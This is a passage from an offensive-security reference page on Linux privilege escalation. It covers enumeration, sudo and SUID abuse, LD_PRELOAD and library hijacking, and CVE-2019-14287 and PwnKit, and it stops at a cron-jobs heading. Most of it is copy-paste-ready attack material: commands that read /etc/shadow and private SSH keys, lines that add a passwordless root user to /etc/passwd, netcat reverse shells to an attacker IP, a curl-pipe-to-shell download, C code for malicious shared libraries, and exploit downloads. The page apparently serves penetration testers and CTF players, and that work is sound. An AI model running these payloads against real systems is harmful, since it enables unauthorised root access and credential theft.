---
title: Privilege Escalation
description: Complete privilege escalation reference with enumeration payloads, exploitation techniques, and methodology for escalating from low-privilege shells to root (Linux) and SYSTEM (Windows).
navigation:
  icon: i-lucide-arrow-up-circle
  title: Privilege Escalation
---

Privilege Escalation is the act of exploiting a vulnerability, misconfiguration, or design flaw in an operating system or application to **gain elevated access** beyond what was originally granted. It is the bridge between **initial foothold** and **full system compromise**.

After landing a low-privilege shell on a target, escalation to `root` (Linux) or `NT AUTHORITY\SYSTEM` (Windows) unlocks complete control — reading all files, dumping credentials, installing persistence, pivoting to other machines, and accessing sensitive data.

This reference provides **methodology context** for every vector and **copy-paste-ready payloads** organized by technique.

::note
Replace target-specific values (`10.10.14.5`, usernames, file paths) with your engagement details. All payloads assume you already have an initial low-privilege shell on the target.
::

---

## :icon{name="i-lucide-lightbulb"} How Privilege Escalation Works

### Escalation Types

| Type | Description | Example | Impact |
| ---- | ----------- | ------- | ------ |
| **Vertical** | Low-privilege → Higher-privilege | `www-data` → `root` | Full system control |
| **Horizontal** | Same privilege → Different user | `user-a` → `user-b` | Access to different data/permissions |

### The Methodology

Every privilege escalation — regardless of operating system, technique, or complexity — follows the same fundamental workflow. **Enumeration is 90% of the work.** The exploit itself is usually the easy part once you identify the vector.

::steps{level="4"}

#### Enumerate Everything

Gather information about the OS version, kernel, users, groups, running processes, installed software, network connections, scheduled tasks, file permissions, and stored credentials. Cast a wide net — the escalation path is often hidden in overlooked details.

#### Identify Weaknesses

Analyze enumeration output for misconfigurations — weak file permissions, writable scripts running as root, SUID binaries, unquoted service paths, stored passwords in config files, exploitable kernel versions, and dangerous group memberships.

#### Exploit the Vector

Use the identified weakness to execute commands, read files, or spawn a shell as the higher-privileged user. This step is usually straightforward once the vector is found.

#### Verify and Stabilize

Confirm elevated privileges with `whoami`, `id`, or by accessing protected files. Stabilize your elevated shell and consider persistence if the engagement requires it.

::

::tip
**Always run automated enumeration tools first** — `linPEAS`, `winPEAS`, `PowerUp`, `Seatbelt`. They check hundreds of vectors simultaneously and color-code critical findings. Then follow up with manual checks for anything the tools might miss.
::

---

## :icon{name="i-lucide-terminal"} Linux — System Enumeration

Before exploiting anything, you must **map the target system completely**. These payloads gather the information needed to identify privilege escalation vectors.

### Identity & Users

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Enumeration" color="blue"}
  :badge{label="Users" color="orange"}
  :badge{label="Groups" color="red"}
  :badge{label="First Step" color="purple"}
::

![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)

Understanding **who you are**, **what groups you belong to**, and **who else is on the system** is the foundation of privilege escalation. Group memberships like `docker`, `lxd`, `disk`, `adm`, and `sudo` can provide direct escalation paths.

```bash [Current Identity]
whoami
id
groups
```

```bash [All Users]
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
awk -F: '$3 >= 1000 {print $1}' /etc/passwd
awk -F: '$3 == 0 {print $1}' /etc/passwd
```

```bash [Login History]
w
who
last
lastlog
```

```bash [SSH Keys]
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
```

---

### System & Kernel Information

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Enumeration" color="blue"}
  :badge{label="Kernel" color="orange"}
  :badge{label="OS Version" color="red"}
  :badge{label="Architecture" color="purple"}
::

The **kernel version** determines which kernel exploits are available. The **OS distribution and version** affect which packages are installed and which default configurations apply. Architecture (`x86_64` vs `i686`) determines which compiled exploits will work.

```bash [OS & Kernel]
uname -a
uname -r
cat /proc/version
cat /etc/os-release
cat /etc/issue
lsb_release -a 2>/dev/null
hostname
arch
uname -m
```

```bash [Environment Variables]
env
printenv
cat /proc/self/environ 2>/dev/null
echo $PATH
```

```bash [Disk & Filesystem]
df -h
mount
cat /etc/fstab
lsblk
```

---

### Network & Processes

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Enumeration" color="blue"}
  :badge{label="Network" color="orange"}
  :badge{label="Processes" color="red"}
  :badge{label="Internal Services" color="purple"}
::

Network enumeration reveals **internal services** not exposed externally (databases, admin panels, APIs running on localhost). Process enumeration shows what's running as root — potential targets for exploitation.

::tabs
  :::tabs-item{icon="i-lucide-network" label="Network"}
  ```bash [Interfaces & Routes]
  ip a
  ifconfig 2>/dev/null
  ip route
  route -n 2>/dev/null
  ```

  ```bash [Open Ports & Connections]
  ss -tulnp
  netstat -tulnp 2>/dev/null
  ss -antp
  netstat -antp 2>/dev/null
  ```

  ```bash [DNS & Hosts]
  cat /etc/resolv.conf
  cat /etc/hosts
  arp -a 2>/dev/null
  ip neigh
  ```

  ```bash [Firewall]
  iptables -L -n 2>/dev/null
  cat /etc/iptables/rules.v4 2>/dev/null
  ufw status 2>/dev/null
  ```
  :::

  :::tabs-item{icon="i-lucide-cpu" label="Processes"}
  ```bash [Running Processes]
  ps aux
  ps -ef
  ps aux | grep -i root
  pstree 2>/dev/null
  ```

  ```bash [Process Monitor — pspy]
  # Monitor all processes without root (discovers cron jobs)
  # Download: https://github.com/DominicBreuker/pspy
  ./pspy64
  ./pspy32
  ```
  :::
::

::note
Internal services running on `127.0.0.1` or `0.0.0.0` on non-standard ports often have **weaker security** than external-facing services. Look for databases, admin panels, and API endpoints that might contain credentials or be exploitable.
::

---

### Sensitive File Discovery

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Enumeration" color="blue"}
  :badge{label="Credentials" color="orange"}
  :badge{label="Config Files" color="red"}
  :badge{label="Passwords" color="purple"}
  :badge{label="Critical" color="neutral"}
::

Credentials are **everywhere** on Linux systems — in configuration files, shell histories, environment variables, database configs, backup files, and application source code. This is often the fastest path to escalation.

::code-collapse

```bash [Password Files]
cat /etc/shadow 2>/dev/null
cat /etc/passwd
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
cat /etc/master.passwd 2>/dev/null
```

```bash [Shell History — Often Contains Passwords]
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
history
```

```bash [Application Config Files]
# Web application configs
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" -o -name "db.php" -o -name "database.php" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "settings.py" 2>/dev/null
find / -name "application.properties" 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# Database configs
cat /etc/mysql/my.cnf 2>/dev/null
cat ~/.my.cnf 2>/dev/null
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null

# General config search
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -50
```

```bash [Grep for Passwords in Files]
grep -ri "password" /etc/ 2>/dev/null | grep -v ":#"
grep -ri "password\|passwd\|pwd" /var/www/ 2>/dev/null
grep -ri "DB_PASSWORD\|DB_USER\|DB_HOST" /var/www/ 2>/dev/null
grep -ri "pass\|pwd\|token\|secret\|key\|api" /opt/ 2>/dev/null
grep -ri "password" /home/ 2>/dev/null
grep -ri "ConnectionString" /var/www/ 2>/dev/null
```

```bash [Backup & Interesting Files]
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*~" 2>/dev/null
find / -name "*.sql" -o -name "*.sql.gz" -o -name "*.sql.bz2" 2>/dev/null
find / -name "*.tar.gz" -o -name "*.tgz" -o -name "*.zip" 2>/dev/null | head -20
find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null
```

```bash [File Permissions — Writable by Current User]
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"
find / -writable -user root -type f 2>/dev/null
find / -type d -perm -0002 2>/dev/null | grep -v "/proc\|/sys"
```

```bash [Recently Modified Files]
find / -mmin -10 -type f 2>/dev/null | grep -v "/proc\|/sys"
find / -mtime -1 -type f 2>/dev/null | grep -v "/proc\|/sys"
```

::

---

### Automated Enumeration Tools

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Automated" color="blue"}
  :badge{label="linPEAS" color="orange"}
  :badge{label="LinEnum" color="red"}
  :badge{label="lse" color="purple"}
  :badge{label="Essential" color="neutral"}
::

![linPEAS](https://img.shields.io/badge/linPEAS-CD6155?style=for-the-badge) ![pspy](https://img.shields.io/badge/pspy-333333?style=for-the-badge)

Automated tools check **hundreds of privilege escalation vectors** in seconds. They are not a replacement for manual enumeration but provide a comprehensive starting point that highlights the most critical findings with color-coded output.

**linPEAS** is the gold standard — it checks sudo permissions, SUID binaries, capabilities, cron jobs, writable files, stored credentials, kernel vulnerabilities, container escapes, and dozens more vectors in a single run.

::tabs
  :::tabs-item{icon="i-lucide-zap" label="linPEAS"}
  ```bash [Download + Execute — Fileless]
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -q -O - | sh
  ```

  ```bash [Download + Save + Run]
  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ./linpeas.sh | tee linpeas_output.txt
  ./linpeas.sh -s    # superfast — no network checks
  ./linpeas.sh -a    # all checks including slow ones
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="LinEnum / lse"}
  ```bash [LinEnum]
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
  chmod +x LinEnum.sh
  ./LinEnum.sh -t
  ```

  ```bash [linux-smart-enumeration]
  wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
  chmod +x lse.sh
  ./lse.sh -l 0    # minimal output
  ./lse.sh -l 1    # interesting findings
  ./lse.sh -l 2    # all information
  ```
  :::

  :::tabs-item{icon="i-lucide-eye" label="pspy — Process Monitor"}
  ```bash [pspy]
  # Monitor processes in real-time without root
  # Discovers: cron jobs, scripts, automated tasks
  wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
  chmod +x pspy64
  ./pspy64

  # 32-bit version
  wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
  chmod +x pspy32
  ./pspy32
  ```
  :::
::

::card-group
  ::card
  ---
  title: PEASS-ng (linPEAS)
  icon: i-simple-icons-github
  to: https://github.com/peass-ng/PEASS-ng
  target: _blank
  ---
  16K+ ⭐ — The most comprehensive automated Linux and Windows privilege escalation enumeration suite.
  ::

  ::card
  ---
  title: pspy — Process Spy
  icon: i-simple-icons-github
  to: https://github.com/DominicBreuker/pspy
  target: _blank
  ---
  5K+ ⭐ — Monitor processes without root privileges — essential for discovering cron jobs.
  ::

  ::card
  ---
  title: linux-smart-enumeration
  icon: i-simple-icons-github
  to: https://github.com/diego-treitos/linux-smart-enumeration
  target: _blank
  ---
  3K+ ⭐ — Smart Linux enumeration with configurable verbosity levels.
  ::
::

---

## :icon{name="i-lucide-shield-alert"} Linux — SUDO Abuse

### How SUDO Privilege Escalation Works

`sudo` allows a permitted user to execute commands as another user (typically root). The configuration lives in `/etc/sudoers` and defines exactly **which commands** each user can run, **as which user**, and **whether a password is required**.

When `sudo -l` reveals that your user can run specific commands as root — especially with `NOPASSWD` — those commands can often be **abused** to escape into a root shell. The abuse works because many binaries have built-in features that allow:

- **Shell spawning** — editors like `vim` can run `:!bash`
- **File reading** — pagers like `less` can view `/etc/shadow`
- **File writing** — tools like `tee` can overwrite `/etc/passwd`
- **Command execution** — utilities like `find` support `-exec`

::warning
`sudo -l` is the **single most important privilege escalation check** on Linux. Always run it first. If you see `(ALL) NOPASSWD:` or `(root) NOPASSWD:` entries, you very likely have a direct path to root.
::

### SUDO — Check Permissions

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUDO" color="blue"}
  :badge{label="Check First" color="orange"}
  :badge{label="Most Common Vector" color="red"}
::

```bash [Check SUDO Permissions]
sudo -l

# Example outputs and what they mean:
# (root) NOPASSWD: /usr/bin/vim          → Can run vim as root WITHOUT password
# (root) /usr/bin/find                   → Can run find as root WITH password
# (ALL : ALL) NOPASSWD: ALL             → Can run ANYTHING as root → instant root
# (ALL, !root) /bin/bash                → Restricted — may be bypassable (CVE-2019-14287)
# (user2) NOPASSWD: /bin/bash           → Can get shell as user2 (horizontal)
```

```bash [Instant Root — If ALL is allowed]
# If sudo -l shows: (ALL) NOPASSWD: ALL
sudo su
sudo /bin/bash
sudo -i
```

---

### SUDO — Binary Exploitation

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUDO" color="blue"}
  :badge{label="Shell Escape" color="orange"}
  :badge{label="GTFOBins" color="red"}
  :badge{label="Root Shell" color="purple"}
  :badge{label="Copy-Paste Ready" color="neutral"}
::

![GTFOBins](https://img.shields.io/badge/GTFOBins-333333?style=for-the-badge&logo=gnubash&logoColor=white)

Each binary below can be abused when allowed via `sudo` to obtain a root shell. These are organized by category and represent the **most commonly encountered** sudo escalation vectors in real engagements and CTFs.

The key insight is that many legitimate programs have features that allow **executing arbitrary commands** or **spawning shells** — features that become dangerous when the program runs as root.

::tabs
  :::tabs-item{icon="i-lucide-file-edit" label="Editors & Pagers"}
  ```bash [vim / vi — Shell escape from editor]
  sudo vim -c '!bash'
  sudo vim -c '!sh'

  # Or from inside vim:
  # Press ESC, then type:
  # :!bash
  # :!/bin/sh
  # :shell
  # :set shell=/bin/bash
  # :shell
  ```

  ```bash [nano — Shell escape from editor]
  sudo nano
  # Press Ctrl+R (read file)
  # Press Ctrl+X (execute command)
  # Type: reset; bash 1>&0 2>&0
  ```

  ```bash [less — Shell escape from pager]
  sudo less /etc/passwd
  # Type: !/bin/bash
  # Or:   !sh
  ```

  ```bash [more — Shell escape from pager]
  sudo more /etc/passwd
  # Type: !/bin/bash
  # Note: terminal must be smaller than file content
  ```

  ```bash [man — Shell escape from manual]
  sudo man man
  # Type: !/bin/bash
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Languages"}
  ```bash [python / python3]
  sudo python3 -c 'import os; os.system("/bin/bash")'
  sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
  sudo python3 -c 'import os; os.execvp("/bin/sh", ["sh"])'
  sudo python -c 'import os; os.system("/bin/bash")'
  ```

  ```bash [perl]
  sudo perl -e 'exec "/bin/bash";'
  sudo perl -e 'system("/bin/sh");'
  ```

  ```bash [ruby]
  sudo ruby -e 'exec "/bin/bash"'
  ```

  ```bash [lua]
  sudo lua -e 'os.execute("/bin/bash")'
  ```

  ```bash [node / javascript]
  sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
  ```

  ```bash [php]
  sudo php -r 'system("/bin/bash");'
  sudo php -r 'passthru("/bin/bash");'
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="System Utilities"}
  ```bash [find — Execute arbitrary commands]
  sudo find / -exec /bin/bash \; -quit
  sudo find . -exec /bin/sh \; -quit
  sudo find /etc -exec sh -i \; -quit
  ```

  ```bash [env — Replace current process]
  sudo env /bin/bash
  sudo env /bin/sh
  ```

  ```bash [awk — System command execution]
  sudo awk 'BEGIN {system("/bin/bash")}'
  ```

  ```bash [sed]
  sudo sed -n '1e exec bash 1>&0' /etc/hosts
  ```

  ```bash [tar — Checkpoint action]
  sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
  ```

  ```bash [zip — Unzip command injection]
  sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
  ```

  ```bash [nmap — Interactive mode (versions < 5.21)]
  sudo nmap --interactive
  # nmap> !sh

  # Modern nmap — script execution
  TF=$(mktemp)
  echo 'os.execute("/bin/bash")' > $TF
  sudo nmap --script=$TF
  ```

  ```bash [git — Pager escape]
  sudo git help config
  # Type: !/bin/bash

  sudo git -p help
  # Type: !/bin/bash
  ```

  ```bash [docker — Full filesystem access]
  sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash
  ```

  ```bash [systemctl — Pager escape]
  sudo systemctl
  # Type: !bash
  # Or: !/bin/sh
  ```
  :::

  :::tabs-item{icon="i-lucide-file-output" label="File Operations"}
  ```bash [tee — Write to privileged files]
  # Add a passwordless root user to /etc/passwd
  echo "hacker::0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
  su hacker
  ```

  ```bash [cp — Overwrite privileged files]
  cp /etc/passwd /tmp/passwd.bak
  echo "hacker::0:0::/root:/bin/bash" >> /tmp/passwd.bak
  sudo cp /tmp/passwd.bak /etc/passwd
  su hacker
  ```

  ```bash [wget — Download and overwrite files]
  # Host a malicious /etc/passwd on attacker with the new root user added
  sudo wget http://10.10.14.5/passwd -O /etc/passwd
  su hacker
  ```

  ```bash [curl — Read privileged files]
  sudo curl file:///etc/shadow
  sudo curl file:///root/.ssh/id_rsa
  ```

  ```bash [cat / head / tail — Read privileged files]
  sudo cat /etc/shadow
  sudo head /etc/shadow
  sudo tail /etc/shadow
  sudo cat /root/.ssh/id_rsa
  ```
  :::

  :::tabs-item{icon="i-lucide-radio" label="Network Tools"}
  ```bash [nc / netcat — Reverse shell as root]
  sudo nc -e /bin/bash 10.10.14.5 4444
  sudo nc 10.10.14.5 4444 -e /bin/sh
  ```

  ```bash [socat]
  sudo socat stdin exec:/bin/bash
  ```

  ```bash [ssh — ProxyCommand escape]
  sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
  ```

  ```bash [ftp — Shell escape]
  sudo ftp
  # ftp> !/bin/bash
  ```

  ```bash [mysql — Shell escape]
  sudo mysql -e '\! /bin/bash'
  # Or inside mysql: \! bash
  ```

  ```bash [psql — Shell escape]
  sudo psql
  # \! /bin/bash
  ```

  ```bash [sqlite3 — Shell escape]
  sudo sqlite3 /dev/null
  # .shell /bin/bash
  ```
  :::
::

::card-group
  ::card
  ---
  title: GTFOBins — Sudo
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/#+sudo
  target: _blank
  ---
  Complete searchable list of every binary exploitable via sudo — with exact commands.
  ::
::

---

### SUDO — LD_PRELOAD Injection

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUDO" color="blue"}
  :badge{label="LD_PRELOAD" color="orange"}
  :badge{label="Shared Library" color="red"}
  :badge{label="Root Shell" color="purple"}
::

**How LD_PRELOAD works:** `LD_PRELOAD` is an environment variable that tells the dynamic linker to load a specified shared library **before all others** when a program starts. If `sudo` is configured to **preserve** this variable (`env_keep+=LD_PRELOAD`), any sudo command will load your malicious library first — and its constructor function (`_init()`) runs as root before the actual program even starts.

This means you can inject arbitrary root-level code into **any** sudo-allowed command, regardless of what that command normally does.

```bash [Step 1 — Check for LD_PRELOAD preservation]
sudo -l
# Look for this line in the output:
# env_keep += LD_PRELOAD
```

```c [Step 2 — Create malicious shared library (shell.c)]
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");     // Clean up to avoid issues
    setresuid(0, 0, 0);         // Set all UIDs to root
    system("/bin/bash -p");     // Spawn root shell
}
```

```bash [Step 3 — Compile and exploit]
# Compile as shared library
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Run ANY sudo-allowed command with LD_PRELOAD set
# Even "sudo /usr/bin/find" or "sudo /usr/sbin/apache2" works
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_sudo_command>

# Example:
sudo LD_PRELOAD=/tmp/shell.so find
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/env
```

::caution
The allowed sudo command itself doesn't matter — `LD_PRELOAD` runs your code **before** the command executes. Even harmless commands like `sudo /usr/bin/id` will give you a root shell.
::

---

### SUDO — LD_LIBRARY_PATH Hijacking

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUDO" color="blue"}
  :badge{label="LD_LIBRARY_PATH" color="orange"}
  :badge{label="Library Hijack" color="red"}
::

**How it works:** If `env_keep+=LD_LIBRARY_PATH` is preserved through sudo, you can create a malicious version of a library that the sudo-allowed binary depends on. When the binary loads, it finds your malicious library first and executes your code as root.

```bash [Step 1 — Find library dependencies]
ldd /usr/bin/allowed_binary
# Example output:
# libcustom.so => /usr/lib/libcustom.so (0x...)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x...)
```

```c [Step 2 — Create hijack library (hijack.c)]
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash [Step 3 — Compile and exploit]
# Compile with same name as target library
gcc -fPIC -shared -o /tmp/libcustom.so hijack.c

# Run sudo command with LD_LIBRARY_PATH pointing to /tmp
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_binary
```

---

### SUDO — CVE-2019-14287 (Sudo < 1.8.28)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUDO" color="blue"}
  :badge{label="CVE-2019-14287" color="orange"}
  :badge{label="sudo < 1.8.28" color="red"}
  :badge{label="Bypass Restriction" color="purple"}
::

**How it works:** When `sudo -l` shows `(ALL, !root)` — meaning you can run a command as **any user EXCEPT root** — this CVE allows bypassing that restriction. User ID `-1` (or `4294967295`) is not properly handled by sudo versions before 1.8.28, and it resolves to UID `0` (root).

```bash [Check — Is this exploitable?]
sudo -l
# Must show: (ALL, !root) NOPASSWD: /bin/bash
# Or:        (ALL, !root) /some/command

# Check sudo version
sudo --version
# Vulnerable if < 1.8.28
```

```bash [Exploit]
sudo -u#-1 /bin/bash
# Or:
sudo -u#4294967295 /bin/bash
# Both resolve to UID 0 (root)
```

---

### SUDO — Quick Reference Table

| Binary | Sudo Escape Command |
| ------ | ------------------- |
| `vim` | `:!bash` or `sudo vim -c '!bash'` |
| `nano` | `Ctrl+R` → `Ctrl+X` → `reset; bash 1>&0 2>&0` |
| `less` | `!/bin/bash` |
| `more` | `!/bin/bash` |
| `man` | `!/bin/bash` |
| `ftp` | `!/bin/bash` |
| `gdb` | `!/bin/bash` |
| `mysql` | `\! /bin/bash` |
| `psql` | `\! /bin/bash` |
| `sqlite3` | `.shell /bin/bash` |
| `irb` | `exec "/bin/bash"` |
| `python` | `sudo python -c 'import os;os.system("/bin/bash")'` |
| `perl` | `sudo perl -e 'exec "/bin/bash"'` |
| `ruby` | `sudo ruby -e 'exec "/bin/bash"'` |
| `find` | `sudo find / -exec /bin/bash \; -quit` |
| `awk` | `sudo awk 'BEGIN{system("/bin/bash")}'` |
| `env` | `sudo env /bin/bash` |
| `docker` | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash` |

---

## :icon{name="i-lucide-shield-alert"} Linux — SUID / SGID Binaries

### How SUID Privilege Escalation Works

The **SUID (Set User ID)** permission bit is a special Unix file permission that allows a program to execute with the **file owner's privileges** rather than the privileges of the user running it. When a binary owned by root has the SUID bit set (shown as `s` in permissions: `-rwsr-xr-x`), it runs as root regardless of who executes it.

This is normally used for legitimate purposes — `passwd` needs root to modify `/etc/shadow`, `ping` needs root for raw sockets. But when a SUID binary has features that allow shell commands, file reads, or writes, those features execute as root too.

**What to look for:**
- SUID binaries that are NOT standard system binaries (custom applications)
- Standard binaries that have shell escape capabilities
- SUID binaries with known vulnerabilities

### SUID — Discovery

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUID" color="blue"}
  :badge{label="Discovery" color="orange"}
  :badge{label="File Permissions" color="red"}
::

```bash [Find All SUID Binaries]
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -type f 2>/dev/null
```

```bash [Find SGID Binaries]
find / -perm -2000 -type f 2>/dev/null
```

```bash [Find Both SUID and SGID]
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
```

```bash [List with Details — Identify Unusual Ones]
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

::tip
Compare the discovered SUID binaries against the **default list** for that distribution. Any binary not in the default set is **custom** and worth thorough investigation. Check each one against GTFOBins.
::

---

### SUID — Exploiting Common Binaries

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUID" color="blue"}
  :badge{label="Exploitation" color="orange"}
  :badge{label="Root Shell" color="red"}
  :badge{label="GTFOBins" color="purple"}
::

::code-collapse

```bash [bash / sh — The -p flag is critical]
# The -p flag tells bash to NOT drop privileges
# Without -p, bash drops the SUID privileges automatically
/bin/bash -p
/bin/sh -p
```

```bash [find]
find . -exec /bin/sh -p \; -quit
find / -exec /bin/bash -p \; -quit
```

```bash [python / python3]
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash [perl]
perl -e 'exec "/bin/sh -p";'
perl -e 'setuid(0); exec "/bin/bash";'
```

```bash [vim]
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "sh -p")'
```

```bash [env]
env /bin/sh -p
```

```bash [nmap (old versions with SUID)]
nmap --interactive
# nmap> !sh
```

```bash [cp — Overwrite /etc/passwd]
# Read the current passwd file
cat /etc/passwd > /tmp/passwd.bak
# Add a root user with no password
echo "hacker::0:0::/root:/bin/bash" >> /tmp/passwd.bak
# Overwrite with SUID cp
cp /tmp/passwd.bak /etc/passwd
# Switch to new root user
su hacker
```

```bash [pkexec — CVE-2021-4034 (PwnKit)]
# Affects virtually ALL Linux distros with polkit < 0.120
# Check: pkexec --version

# Method 1: Pre-compiled
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit

# Method 2: Compile from source
git clone https://github.com/arthepsy/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
```

::

::card-group
  ::card
  ---
  title: GTFOBins — SUID
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/#+suid
  target: _blank
  ---
  Complete list of binaries exploitable via SUID bit with exact payload commands.
  ::

  ::card
  ---
  title: PwnKit (CVE-2021-4034)
  icon: i-simple-icons-github
  to: https://github.com/ly4k/PwnKit
  target: _blank
  ---
  Self-contained exploit for polkit pkexec — works on nearly all Linux distributions.
  ::
::

---

### SUID — PATH Variable Hijacking

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUID" color="blue"}
  :badge{label="PATH Hijack" color="orange"}
  :badge{label="Relative Path" color="red"}
  :badge{label="Very Common in CTF" color="purple"}
::

![PATH Hijack](https://img.shields.io/badge/PATH_Hijack-E74C3C?style=for-the-badge)

**How PATH hijacking works:** When a SUID binary executes another program using a **relative path** (e.g., `system("service apache2 restart")` instead of `system("/usr/sbin/service apache2 restart")`), the operating system searches the directories listed in the `$PATH` variable to find that program.

If you **prepend a directory you control** to the beginning of `$PATH` and place a malicious binary with the same name in that directory, the OS finds your version first and executes it — **with root privileges** because the parent SUID binary runs as root.

**Detection:** Use `strings` on the SUID binary to identify commands called without full paths.

```bash [Step 1 — Identify relative path calls]
# Look at what strings/commands the SUID binary contains
strings /usr/local/bin/suid_binary

# Look for relative commands like:
# "service apache2 restart"     ← EXPLOITABLE (no full path)
# "curl http://..."             ← EXPLOITABLE (no full path)
# "/usr/sbin/service restart"   ← NOT exploitable (full path)

# Alternative: trace system calls
ltrace /usr/local/bin/suid_binary 2>&1
strace /usr/local/bin/suid_binary 2>&1 | grep -i exec
```

```bash [Step 2 — Create malicious binary]
# Simple method — bash script
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# More reliable — compiled C binary
cat > /tmp/service.c << 'EOF'
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/service.c -o /tmp/service
```

```bash [Step 3 — Hijack PATH and trigger]
# Prepend /tmp to PATH so our malicious "service" is found first
export PATH=/tmp:$PATH

# Run the SUID binary — it calls "service" which now resolves to /tmp/service
/usr/local/bin/suid_binary
# → root shell!

# Verify
whoami
# root
```

::note
This technique is **extremely common** in CTF challenges and OSCP exam machines. Always check custom SUID binaries for relative path calls using `strings` and `ltrace`.
::

---

### SUID — Shared Object (.so) Injection

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="SUID" color="blue"}
  :badge{label="Shared Object" color="orange"}
  :badge{label=".so Hijack" color="red"}
  :badge{label="Missing Library" color="purple"}
::

**How it works:** If a SUID binary tries to load a shared library (`.so` file) from a **writable directory** or tries to load a library that **doesn't exist** from a path you can write to, you can place a malicious library there. When the SUID binary loads it, your code executes as root.

```bash [Step 1 — Find missing shared objects]
strace /usr/local/bin/suid_binary 2>&1 | grep -i "no such file"
# Output: open("/home/user/.config/libcustom.so", O_RDONLY) = -1 ENOENT

ltrace /usr/local/bin/suid_binary 2>&1 | grep -i "failed"
```

```c [Step 2 — Create malicious library (inject.c)]
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash [Step 3 — Compile and place]
gcc -shared -fPIC -o /home/user/.config/libcustom.so inject.c

# Run the SUID binary — it loads our malicious library
/usr/local/bin/suid_binary
# → root shell
```

---

## :icon{name="i-lucide-clock"} Linux — Cron Jobs

### How Cron Privilege Escalation Works

